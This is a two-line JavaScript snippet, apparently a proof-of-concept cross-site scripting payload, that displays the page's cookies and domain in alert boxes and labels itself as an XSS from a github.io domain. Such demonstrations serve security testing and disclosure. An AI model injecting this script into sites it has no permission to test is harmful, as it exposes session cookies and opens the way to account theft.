alert ("This is an XSS from *.github.io domain" + document.cookie);
top.alert(document.domain)
